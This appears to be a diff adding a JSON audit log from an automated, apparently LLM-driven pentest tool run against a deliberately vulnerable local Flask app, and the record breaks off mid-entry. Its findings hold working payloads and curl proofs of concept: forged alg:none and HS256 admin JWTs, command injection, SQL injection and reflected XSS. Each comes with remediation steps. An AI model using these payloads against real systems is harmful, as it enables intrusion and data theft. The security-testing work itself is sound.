@@ -1,0 +1,572 @@
+{
+  "tool": "AXIOM RED",
+  "session_id": "efb1cf12-a01",
+  "target": "http://localhost:5000",
+  "generated_at": "2026-10-22T07:25:24.898472",
+  "algorithm": "sha256-chain",
+  "genesis": "0000000000000000000000000000000000000000000000000000000000000000",
+  "root_hash": "4969a065e315f1b0d0189113a06cde190067b154ecee78966a40f9cbbd5f3a3b",
+  "record_count": 35,
+  "chain": [
+    {
+      "seq": 0,
+      "prev_hash": "0000000000000000000000000000000000000000000000000000000000000000",
+      "entry_hash": "3db5d44c33e2aaf3787ae3827062ebec6095434a471a32eae0db82798707a903",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:21:31.025674",
+        "phase": "RECON",
+        "thought": "Starting recon on http://localhost:5000. I'll scan ports first, then discover web endpoints and fingerprint technologies.",
+        "action": "Port scan + endpoint discovery on http://localhost:5000",
+        "result": "Initiating...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 1,
+      "prev_hash": "3db5d44c33e2aaf3787ae3827062ebec6095434a471a32eae0db82798707a903",
+      "entry_hash": "5a6ec989715d7b36eb8f4dff3df19196f42ef1eae0eaf3b36bd7cfb354e660ac",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:21:38.207632",
+        "phase": "RECON",
+        "thought": null,
+        "action": "Port scan complete",
+        "result": "Found 1 open ports: [5000]",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 2,
+      "prev_hash": "5a6ec989715d7b36eb8f4dff3df19196f42ef1eae0eaf3b36bd7cfb354e660ac",
+      "entry_hash": "3b58746d4c6b1cdaa57f0904a482b90791f03859fe5a0538cb3017e72f99b486",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:22:37.318675",
+        "phase": "RECON",
+        "thought": null,
+        "action": "Endpoint discovery complete",
+        "result": "Found 10 live endpoints",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 3,
+      "prev_hash": "3b58746d4c6b1cdaa57f0904a482b90791f03859fe5a0538cb3017e72f99b486",
+      "entry_hash": "e6165eeb4f193b4077b69c95dad6b2921dea5f0012bbf3371c3858935ba54727",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:22:57.951112",
+        "phase": "RECON",
+        "thought": null,
+        "action": "Parameter discovery complete",
+        "result": "Mapped params for 10 endpoint(s)",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 4,
+      "prev_hash": "e6165eeb4f193b4077b69c95dad6b2921dea5f0012bbf3371c3858935ba54727",
+      "entry_hash": "3f666540287e0ad58cb187dd240eddde5b47096f2f72c0862181c91fe42ad980",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:00.003407",
+        "phase": "RECON",
+        "thought": null,
+        "action": "Technology fingerprint complete",
+        "result": "Server: Werkzeug/3.1.8 Python/3.11.9, Framework: Flask (Werkzeug)",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 5,
+      "prev_hash": "3f666540287e0ad58cb187dd240eddde5b47096f2f72c0862181c91fe42ad980",
+      "entry_hash": "85c8878907b4dd992bb4319a30e5a926b9999ae636becb8757b1d374836c0784",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:52.452142",
+        "phase": "ANALYSE",
+        "thought": null,
+        "action": "LLM analysis unavailable \u2014 used rule-based summary",
+        "result": "(LLM error logged internally: GoogleInvalidRequestError)",
+        "status": "error"
+      }
+    },
+    {
+      "seq": 6,
+      "prev_hash": "85c8878907b4dd992bb4319a30e5a926b9999ae636becb8757b1d374836c0784",
+      "entry_hash": "29264dc2abb5df4efaae8ccc6693efb22f68f1c1f970b2d6222dd8b6b2a0593c",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:54.202431",
+        "phase": "PLAN",
+        "thought": null,
+        "action": "Fallback plan used",
+        "result": "Error calling model 'gemini-3.8-flash' (INVALID_ARGUMENT): 400 INVALID_ARGUMENT. {'error': {'code': 400, 'message': 'API key not valid. Please pass a valid API key.', 'status': 'INVALID_ARGUMENT', 'details': [{'@type': 'type.googleapis.com/google.rpc.ErrorInfo', 'reason': 'API_KEY_INVALID', 'domain': 'googleapis.com', 'metadata': {'service': 'generativelanguage.googleapis.com'}}, {'@type': 'type.googleapis.com/google.rpc.LocalizedMessage', 'locale': 'en-US', 'message': 'API key not valid. Please pass a valid API key.'}]}}",
+        "status": "error"
+      }
+    },
+    {
+      "seq": 7,
+      "prev_hash": "29264dc2abb5df4efaae8ccc6693efb22f68f1c1f970b2d6222dd8b6b2a0593c",
+      "entry_hash": "526317f80545333c27de0c62fdb8f8eb22ce8b4e5a4c6cf284d839742a50c7d0",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:54.202431",
+        "phase": "PLAN",
+        "thought": null,
+        "action": "Vectors scored (impact x likelihood)",
+        "result": "jwt_none=7.44; config_exposure=6.93; cmd_injection=6.0; sqli=5.46; idor=4.5; xss=4.32; redis_rce=0.5",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 8,
+      "prev_hash": "526317f80545333c27de0c62fdb8f8eb22ce8b4e5a4c6cf284d839742a50c7d0",
+      "entry_hash": "8d6d102416546e311ebadc0c018230106fb2dc655b1f0e01f45e737d717a5a4d",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:54.203952",
+        "phase": "TEST",
+        "thought": "Admin endpoint, test JWT bypass",
+        "action": "Testing: jwt_none on /api/v1/admin",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 9,
+      "prev_hash": "8d6d102416546e311ebadc0c018230106fb2dc655b1f0e01f45e737d717a5a4d",
+      "entry_hash": "5394d993ce5f39e6cfdfaf73614c310a27dd643a955e982dfa3bf377429241fe",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:56.238047",
+        "phase": "TEST",
+        "thought": "CONFIRMED: JWT Algorithm Confusion \u2014 alg:none Bypass. CVSS 9.3. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: jwt_none",
+        "result": "[Critical] JWT Algorithm Confusion \u2014 alg:none Bypass",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 10,
+      "prev_hash": "5394d993ce5f39e6cfdfaf73614c310a27dd643a955e982dfa3bf377429241fe",
+      "entry_hash": "dcb00d84e1c14459930fe030573d01943a42d63d0356849ec9bdfd298c72b857",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:56.238047",
+        "phase": "TEST",
+        "thought": "Config endpoint may leak secrets",
+        "action": "Testing: config_exposure on /api/v1/config",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 11,
+      "prev_hash": "dcb00d84e1c14459930fe030573d01943a42d63d0356849ec9bdfd298c72b857",
+      "entry_hash": "89365ba5215534aa2d2aceb23966cd02540af0058635771858748876b69647ca",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:58.262516",
+        "phase": "TEST",
+        "thought": "CONFIRMED: Sensitive Configuration Exposure. CVSS 7.7. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: config_exposure",
+        "result": "[High] Sensitive Configuration Exposure",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 12,
+      "prev_hash": "89365ba5215534aa2d2aceb23966cd02540af0058635771858748876b69647ca",
+      "entry_hash": "86dc2367ae8f11a5ef3bb008409d6b45cb317ee8e84c20624ee519000b804224",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:23:58.262516",
+        "phase": "TEST",
+        "thought": "Ping endpoint likely uses shell",
+        "action": "Testing: cmd_injection on /api/v1/ping",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 13,
+      "prev_hash": "86dc2367ae8f11a5ef3bb008409d6b45cb317ee8e84c20624ee519000b804224",
+      "entry_hash": "acacdc99dfc9e900408df0fdde03ff2a8b0c89313f5e2c63eb4c6990d2635893",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:00.405082",
+        "phase": "TEST",
+        "thought": "CONFIRMED: OS Command Injection. CVSS 9.8. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: cmd_injection",
+        "result": "[Critical] OS Command Injection",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 14,
+      "prev_hash": "acacdc99dfc9e900408df0fdde03ff2a8b0c89313f5e2c63eb4c6990d2635893",
+      "entry_hash": "9e2ed2db292f44f121019d908cfb7c928a539bed53f4052a9dedca13c7b0536d",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:00.405082",
+        "phase": "TEST",
+        "thought": "Search likely hits DB directly",
+        "action": "Testing: sqli on /api/v1/search",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 15,
+      "prev_hash": "9e2ed2db292f44f121019d908cfb7c928a539bed53f4052a9dedca13c7b0536d",
+      "entry_hash": "89eb05922b4d24c70624e882af7842588a43b467fa2003099c6e36e4f13f2a4a",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:18.904501",
+        "phase": "TEST",
+        "thought": "CONFIRMED: SQL Injection. CVSS 9.1. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: sqli",
+        "result": "[Critical] SQL Injection",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 16,
+      "prev_hash": "89eb05922b4d24c70624e882af7842588a43b467fa2003099c6e36e4f13f2a4a",
+      "entry_hash": "ced679270246e4a27bbf9089eef47d92ef8a8d51df2bb77a44d84695bff33b52",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:18.904501",
+        "phase": "TEST",
+        "thought": "User endpoint without visible auth",
+        "action": "Testing: idor on /api/v1/users/<id>",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 17,
+      "prev_hash": "ced679270246e4a27bbf9089eef47d92ef8a8d51df2bb77a44d84695bff33b52",
+      "entry_hash": "98eed71e9b67935801a7a4d1d721773c667ce374c1a2b6ef201e5f8458dc139b",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:29.122018",
+        "phase": "TEST",
+        "thought": "CONFIRMED: IDOR \u2014 Insecure Direct Object Reference. CVSS 7.5. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: idor",
+        "result": "[High] IDOR \u2014 Insecure Direct Object Reference",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 18,
+      "prev_hash": "98eed71e9b67935801a7a4d1d721773c667ce374c1a2b6ef201e5f8458dc139b",
+      "entry_hash": "a7cf5ff9898a507bc58a9bb16f3bd3ffcca5536ebaff206cd9e8647da72ed3c9",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:29.122018",
+        "phase": "TEST",
+        "thought": "Greet endpoint reflects user input in HTML",
+        "action": "Testing: xss on /api/v1/greet",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 19,
+      "prev_hash": "a7cf5ff9898a507bc58a9bb16f3bd3ffcca5536ebaff206cd9e8647da72ed3c9",
+      "entry_hash": "80cc5c8b7db38e8bc61e5241997be20f12e809e46c14258c4737c328db29865e",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:31.141771",
+        "phase": "TEST",
+        "thought": "CONFIRMED: Cross-Site Scripting (XSS) \u2014 Reflected. CVSS 7.2. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: xss",
+        "result": "[High] Cross-Site Scripting (XSS) \u2014 Reflected",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 20,
+      "prev_hash": "80cc5c8b7db38e8bc61e5241997be20f12e809e46c14258c4737c328db29865e",
+      "entry_hash": "1b4bea4903a75f12af313b4cccf7850783a294b525bd47544cd3568d792c24a2",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:24:31.141771",
+        "phase": "TEST",
+        "thought": "Unauthenticated Redis is critical",
+        "action": "Testing: redis_rce on ",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 21,
+      "prev_hash": "1b4bea4903a75f12af313b4cccf7850783a294b525bd47544cd3568d792c24a2",
+      "entry_hash": "03a00f0b0795b17238b0b1a9ac26610f3573f4cf6139cc34411609ef512a9534",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:20.726615",
+        "phase": "TEST",
+        "thought": null,
+        "action": "Vector redis_rce: not exploitable or hardened",
+        "result": "No vulnerability confirmed",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 22,
+      "prev_hash": "03a00f0b0795b17238b0b1a9ac26610f3573f4cf6139cc34411609ef512a9534",
+      "entry_hash": "33b657aacfa6a19e022e9e61bfaf9cff9221e749cbe5367d6ae552f0ca73eb1a",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:20.737156",
+        "phase": "REFLECT",
+        "thought": "New artifacts recovered from findings.",
+        "action": "Belief state updated",
+        "result": "Knowledge base updated: emails(+3), hot_endpoints, jwt_secret, db_pass, db_user, db_host, internal_api_key, emails(+1)",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 23,
+      "prev_hash": "33b657aacfa6a19e022e9e61bfaf9cff9221e749cbe5367d6ae552f0ca73eb1a",
+      "entry_hash": "ee298351a7b5bb80afda0a0ce68dfc0b5e71db3c788bb78cf274ad36015b6d2a",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:20.738157",
+        "phase": "REFLECT",
+        "thought": "Artifact(s) ['jwt_secret'] unlock new vector(s) ['jwt_forge']. Re-planning (pass 1/2).",
+        "action": "Adaptive re-plan \u2014 looping back to TEST",
+        "result": "Queued: ['jwt_forge']",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 24,
+      "prev_hash": "ee298351a7b5bb80afda0a0ce68dfc0b5e71db3c788bb78cf274ad36015b6d2a",
+      "entry_hash": "fd30a4fec849c99afebf4768ea4da298a4a80e19a20ddeb1e6a78c7c8656122a",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:20.743188",
+        "phase": "TEST",
+        "thought": "Recovered JWT signing secret enables forging a validly-signed admin token.",
+        "action": "Testing: jwt_forge on ",
+        "result": "Running...",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 25,
+      "prev_hash": "fd30a4fec849c99afebf4768ea4da298a4a80e19a20ddeb1e6a78c7c8656122a",
+      "entry_hash": "f55b2c17b906ff812a95bf853994c5f387747840656fc0bb9b51d6eba6273edc",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:22.898143",
+        "phase": "TEST",
+        "thought": "CONFIRMED: JWT Forgery via Leaked Secret (chained). CVSS 9.6. Moving to capture evidence.",
+        "action": "Vulnerability confirmed: jwt_forge",
+        "result": "[Critical] JWT Forgery via Leaked Secret (chained)",
+        "status": "finding"
+      }
+    },
+    {
+      "seq": 26,
+      "prev_hash": "f55b2c17b906ff812a95bf853994c5f387747840656fc0bb9b51d6eba6273edc",
+      "entry_hash": "22049a81a3be29ac1a05e9099ad81d2eedba3e16cbf0cfbcf34e2e85acc71858",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:22.900718",
+        "phase": "REFLECT",
+        "thought": "Reflection complete \u2014 no new attack unlocked by current evidence.",
+        "action": "No further adaptation needed",
+        "result": "Proceeding to validation",
+        "status": "ok"
+      }
+    },
+    {
+      "seq": 27,
+      "prev_hash": "22049a81a3be29ac1a05e9099ad81d2eedba3e16cbf0cfbcf34e2e85acc71858",
+      "entry_hash": "d925bce54c3b8c7018e5f6dcea819ee654f382331691e4433f99d5dde9878c68",
+      "data": {
+        "kind": "log",
+        "timestamp": "2026-10-22T07:25:24.886474",
+        "phase": "VALIDATE",
+        "thought": null,
+        "action": "Validation",
+        "result": "Error calling model 'gemini-3.8-flash' (INVALID_ARGUMENT): 400 INVALID_ARGUMENT. {'error': {'code': 400, 'message': 'API key not valid. Please pass a valid API key.', 'status': 'INVALID_ARGUMENT', 'details': [{'@type': 'type.googleapis.com/google.rpc.ErrorInfo', 'reason': 'API_KEY_INVALID', 'domain': 'googleapis.com', 'metadata': {'service': 'generativelanguage.googleapis.com'}}, {'@type': 'type.googleapis.com/google.rpc.LocalizedMessage', 'locale': 'en-US', 'message': 'API key not valid. Please pass a valid API key.'}]}}",
+        "status": "error"
+      }
+    },
+    {
+      "seq": 28,
+      "prev_hash": "d925bce54c3b8c7018e5f6dcea819ee654f382331691e4433f99d5dde9878c68",
+      "entry_hash": "0a780fca3327aac98a7a4337aba625401c8867d761941217791162ea3601b258",
+      "data": {
+        "kind": "finding",
+        "id": "62841e09",
+        "title": "JWT Algorithm Confusion \u2014 alg:none Bypass",
+        "severity": "Critical",
+        "cvss_score": 9.3,
+        "description": "The API accepts JWTs with 'alg:none', bypassing signature verification entirely. An attacker can forge any identity including admin roles.",
+        "endpoint": "http://localhost:5000/api/v1/admin",
+        "method": "GET",
+        "payload": "Forged JWT: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFk...",
+        "evidence": "{\n  \"all_users\": [\n    {\n      \"cc\": \"4111111111111111\",\n      \"email\": \"admin@corp.local\",\n      \"id\": 1,\n      \"name\": \"admin\",\n      \"pass\": \"admin123\",\n      \"ssn\": \"000-00-0000\"\n    },\n    {\n      \"cc\": \"4222222222222222\",\n      \"email\": \"alice@corp.local\",\n      \"id\": 2,\n      \"name\": \"alice\",\n      \"pass\": \"alice2024\",\n      \"ssn\": \"123-45-6789\"\n    },\n    {\n      \"cc\": \"4333333333333333\",\n      \"email\": \"bob@corp.local\",\n      \"id\": 3,\n      \"name\": \"bob\",\n      \"pass\": \"bob@pass\",\n     ",
+        "request_dump": "GET http://localhost:5000/api/v1/admin\nAuthorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ.",
+        "response_dump": "{\n  \"all_users\": [\n    {\n      \"cc\": \"4111111111111111\",\n      \"email\": \"admin@corp.local\",\n      \"id\": 1,\n      \"name\": \"admin\",\n      \"pass\": \"admin123\",\n      \"ssn\": \"000-00-0000\"\n    },\n    {\n      \"cc\": \"4222222222222222\",\n      \"email\": \"alice@corp.local\",\n      \"id\": 2,\n      \"name\": \"alice\",",
+        "remediation": "1. Reject 'none' algorithm explicitly in JWT validation.\n2. Use jwt.decode() with algorithms=['HS256'] only \u2014 never include 'none'.\n3. Rotate the JWT signing secret immediately.\n4. Consider switching to RS256 (asymmetric) for production.",
+        "timestamp": "2026-10-22T07:23:56.238047",
+        "owasp_id": "A02",
+        "owasp_category": "A02:2021 Cryptographic Failures",
+        "poc_curl": "curl -s -H \"Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogMSwg...\" \"http://localhost:5000/api/v1/admin\""
+      }
+    },
+    {
+      "seq": 29,
+      "prev_hash": "0a780fca3327aac98a7a4337aba625401c8867d761941217791162ea3601b258",
+      "entry_hash": "dc69910c41a6e3c6b601f79424562d2cf87fc4c9569a4d48d4b6d5b89b63eb21",
+      "data": {
+        "kind": "finding",
+        "id": "6755d7b9",
+        "title": "Sensitive Configuration Exposure",
+        "severity": "High",
+        "cvss_score": 7.7,
+        "description": "Unauthenticated endpoint exposes sensitive configuration data: ['secret', 'api_key', 'db_pass']",
+        "endpoint": "http://localhost:5000/api/v1/config",
+        "method": "GET",
+        "payload": "None (unauthenticated GET)",
+        "evidence": "{\n  \"admin_email\": \"admin@corp.local\",\n  \"db_host\": \"172.20.0.11\",\n  \"db_pass\": \"p@ssw0rd\",\n  \"db_user\": \"dvwa\",\n  \"debug_mode\": true,\n  \"internal_api_key\": \"sk-internal-abc123xyz\",\n  \"jwt_secret\": \"supersecret123\"\n}\n",
+        "request_dump": "GET http://localhost:5000/api/v1/config",
+        "response_dump": "{\n  \"admin_email\": \"admin@corp.local\",\n  \"db_host\": \"172.20.0.11\",\n  \"db_pass\": \"p@ssw0rd\",\n  \"db_user\": \"dvwa\",\n  \"debug_mode\": true,\n  \"internal_api_key\": \"sk-internal-abc123xyz\",\n  \"jwt_secret\": \"supersecret123\"\n}\n",
+        "remediation": "1. Remove /config and debug endpoints from production.\n2. Require authentication for any diagnostic endpoint.\n3. Store secrets in environment variables, not code.\n4. Use a secrets manager (Vault, AWS Secrets Manager).",
+        "timestamp": "2026-10-22T07:23:58.262516",
+        "owasp_id": "A05",
+        "owasp_category": "A05:2021 Security Misconfiguration",
+        "poc_curl": "curl -s \"http://localhost:5000/api/v1/config\""
+      }
+    },
+    {
+      "seq": 30,
+      "prev_hash": "dc69910c41a6e3c6b601f79424562d2cf87fc4c9569a4d48d4b6d5b89b63eb21",
+      "entry_hash": "14db15347b15b491408f6363a59d99cc065590e8063091d33a001ce85c6d4846",
+      "data": {
+        "kind": "finding",
+        "id": "00ec2337",
+        "title": "OS Command Injection",
+        "severity": "Critical",
+        "cvss_score": 9.8,
+        "description": "Unsanitised parameter 'host' is passed to a shell. Technique: semicolon echo canary. Unique canary echoed back \u2014 confirms arbitrary command execution.",
+        "endpoint": "http://localhost:5000/api/v1/ping",
+        "method": "GET",
+        "payload": "127.0.0.1; echo AX931274RED",
+        "evidence": "{\n  \"output\": \"Command 'ping -n 1 127.0.0.1; echo AX931274RED' returned non-zero exit status 1.\"\n}\n",
+        "request_dump": "GET http://localhost:5000/api/v1/ping?host=127.0.0.1; echo AX931274RED",
+        "response_dump": "{\n  \"output\": \"Command 'ping -n 1 127.0.0.1; echo AX931274RED' returned non-zero exit status 1.\"\n}\n",
+        "remediation": "1. Never pass user input to shell commands. Use language-native APIs.\n2. If shell calls are required, use subprocess with shell=False and an args list.\n3. Apply strict input validation (allow-list of safe characters).\n4. Run the application as a non-root user.",
+        "timestamp": "2026-10-22T07:24:00.405082",
+        "owasp_id": "A03",
+        "owasp_category": "A03:2021 Injection",
+        "poc_curl": "curl -s \"http://localhost:5000/api/v1/ping?host=127.0.0.1; echo AX931274RED\""
+      }
+    },
+    {
+      "seq": 31,
+      "prev_hash": "14db15347b15b491408f6363a59d99cc065590e8063091d33a001ce85c6d4846",
+      "entry_hash": "240144a25a3410ea2ac2a966a8e6aa0428fa500a6affcff03cdbc97dcc68be3c",
+      "data": {
+        "kind": "finding",
+        "id": "640ddfec",
+        "title": "SQL Injection",
+        "severity": "Critical",
+        "cvss_score": 9.1,
+        "description": "SQL Injection confirmed via boolean-based blind (differential response length) in parameter 'q' at /api/v1/search.",
+        "endpoint": "http://localhost:5000/api/v1/search",
+        "method": "GET",
+        "payload": "axiomtest' OR 1=1-- ",
+        "evidence": "{\n  \"results\": [\n    {\n      \"email\": \"admin@corp.local\",\n      \"id\": 1,\n      \"name\": \"admin\"\n    },\n    {\n      \"email\": \"alice@corp.local\",\n      \"id\": 2,\n      \"name\": \"alice\"\n    },\n    {\n      \"email\": \"bob@corp.local\",\n      \"id\": 3,\n      \"name\": \"bob\"\n    },\n    {\n      \"email\": \"charlie@corp.local\",\n      \"id\": 4,\n      \"name\": \"charlie\"\n    }\n  ]\n}\n",
+        "request_dump": "GET http://localhost:5000/api/v1/search?q=axiomtest' OR 1=1-- ",
+        "response_dump": "{\n  \"results\": [\n    {\n      \"email\": \"admin@corp.local\",\n      \"id\": 1,\n      \"name\": \"admin\"\n    },\n    {\n      \"email\": \"alice@corp.local\",\n      \"id\": 2,\n      \"name\": \"alice\"\n    },\n    {\n      \"email\": \"bob@corp.local\",\n      \"id\": 3,\n      \"name\": \"bob\"\n    },\n    {\n      \"email\": \"charlie@co",
+        "remediation": "1. Use parameterised queries / prepared statements exclusively.\n2. Never concatenate user input into SQL strings.\n3. Apply input validation and an allow-list.\n4. Enable a WAF with SQL injection rules.",
+        "timestamp": "2026-10-22T07:24:18.904501",
+        "owasp_id": "A03",
+        "owasp_category": "A03:2021 Injection",
+        "poc_curl": "curl -s \"http://localhost:5000/api/v1/search?q=axiomtest' OR 1=1-- \""
+      }
+    },
+    {
+      "seq": 32,
+      "prev_hash": "240144a25a3410ea2ac2a966a8e6aa0428fa500a6affcff03cdbc97dcc68be3c",
+      "entry_hash": "0d78b0807911f14eaf7632043bf34f1f47cd155605a03f1e1a1a6c0eaac4ab57",
+      "data": {
+        "kind": "finding",
+        "id": "a4643691",
+        "title": "IDOR \u2014 Insecure Direct Object Reference",
+        "severity": "High",
+        "cvss_score": 7.5,
+        "description": "Sequential user IDs expose sensitive PII without authentication. Affected IDs: [1, 2, 3, 4]. Exposed fields: ['ssn', 'credit_card']",
+        "endpoint": "http://localhost:5000/api/v1/users/<id>",
+        "method": "GET",
+        "payload": "IDs: 1,2,3,4,5",
+        "evidence": "[\n  {\n    \"id\": 1,\n    \"fields\": [\n      \"ssn\",\n      \"credit_card\"\n    ],\n    \"sample\": \"{'credit_card': '4111111111111111', 'email': 'admin@corp.local', 'id': 1, 'name': 'admin', 'role': 'admin', 'ssn': '000-00-0000'}\"\n  },\n  {\n    \"id\": 2,\n    \"fields\": [\n      \"ssn\",\n      \"credit_card\"\n    ],\n    \"sample\": \"{'credit_card': '4222222222222222', 'email': 'alice@corp.local', 'id': 2, 'name': 'alice', 'role': 'user', 'ssn': '123-45-6789'}\"\n  },\n  {\n    \"id\": 3,\n    \"fields\": [\n      \"ssn\",\n      \"credit_card\"\n    ],\n    \"sample\": \"{'credit_card': '4333333333333333', 'email': 'bob@corp.local', ",
+        "request_dump": "GET http://localhost:5000/api/v1/users/<id> (no auth header)",
+        "response_dump": "{'credit_card': '4111111111111111', 'email': 'admin@corp.local', 'id': 1, 'name': 'admin', 'role': 'admin', 'ssn': '000-00-0000'}",
+        "remediation": "1. Enforce object-level authorisation on every resource endpoint.\n2. Replace sequential integer IDs with UUIDs.\n3. Validate that the authenticated user owns the requested resource.\n4. Apply RBAC middleware to all data endpoints.",
+        "timestamp": "2026-10-22T07:24:29.122018",
+        "owasp_id": "A01",
+        "owasp_category": "A01:2021 Broken Access Control",
+        "poc_curl": "curl -s \"http://localhost:5000/api/v1/users/1\""
+      }
+    },
+    {
+      "seq": 33,
+      "prev_hash": "0d78b0807911f14eaf7632043bf34f1f47cd155605a03f1e1a1a6c0eaac4ab57",
+      "entry_hash": "2b8c12f3581fa2aa7b8a59613fa0b8f2e49a798237de746e27e48c4fbf57412d",
+      "data": {
+        "kind": "finding",
+        "id": "3a623eda",
+        "title": "Cross-Site Scripting (XSS) \u2014 Reflected",
+        "severity": "High",
+        "cvss_score": 7.2,
+        "description": "Reflected XSS via basic script tag in parameter 'name' at /api/v1/greet. User input is reflected in HTML without sanitisation. An attacker can steal session cookies or execute arbitrary JavaScript.",
+        "endpoint": "http://localhost:5000/api/v1/greet",
+        "method": "GET",
+        "payload": "<script>alert('AXIOM-XSS')</script>",
+        "evidence": "<html><body>\n    <h1>Hello, <script>alert('AXIOM-XSS')</script>!</h1>\n    <p>Welcome to CorpAPI.</p>\n    </body></html>",
+        "request_dump": "GET http://localhost:5000/api/v1/greet?name=<script>alert('AXIOM-XSS')</script>",
+        "response_dump": "<html><body>\n    <h1>Hello, <script>alert('AXIOM-XSS')</script>!</h1>\n    <p>Welcome to CorpAPI.</p>\n    </body></html>",
+        "remediation": "1. HTML-escape all user input before rendering (use markupsafe.escape()).\n2. Set Content-Security-Policy header to block inline scripts.\n3. Use Jinja2 with autoescape=True.\n4. Set HttpOnly and Secure flags on session cookies.\n5. Never return raw user input in HTML responses.",
+        "timestamp": "2026-10-22T07:24:31.141771",
+        "owasp_id": "A03",
+        "owasp_category": "A03:2021 Injection",
+        "poc_curl": "curl -s \"http://localhost:5000/api/v1/greet?name=<script>alert('AXIOM-XSS')</script>\""
+      }
+    },
+    {
+      "seq": 34,
+      "prev_hash": "2b8c12f3581fa2aa7b8a59613fa0b8f2e49a798237de746e27e48c4fbf57412d",
+      "entry_hash": "4969a065e315f1b0d0189113a06cde190067b154ecee78966a40f9cbbd5f3a3b",
+      "data": {
+        "kind": "finding",
+        "id": "70b10aa2",
+        "title": "JWT Forgery via Leaked Secret (chained)",
+        "severity": "Critical",
+        "cvss_score": 9.6,
+        "description": "A signing secret recovered from an earlier finding was used to forge a VALIDLY-SIGNED admin JWT. Unlike the alg:none bypass, this defeats a server that correctly verifies signatures \u2014 proving a multi-step attack chain (secret disclosure -> privilege escalation -> full data access).",
+        "endpoint": "http://localhost:5000",
+        "method": "GET",
+        "payload": "HS256 token signed with recovered secret: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2l...",
+        "evidence": "{\n  \"endpoints\": [\n    \"GET  /api/v1/users/<id>\",\n    \"GET  /api/v1/search?q=<query>\",\n    \"POST /api/v1/login\",\n    \"GET  /api/v1/admin\",\n    \"POST /api/v1/upload\",\n    \"GET  /api/v1/ping?host=<host>\",\n    \"GET  /api/v1/config\"\n  ],\n  \"name\": \"CorpAPI v1.0\"\n}\n",
+        "request_dump": "GET http://localhost:5000\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.7rq1qXPlaS5WgsdtcTORuyrSPLC85gOpOJwqx4rfCv4",
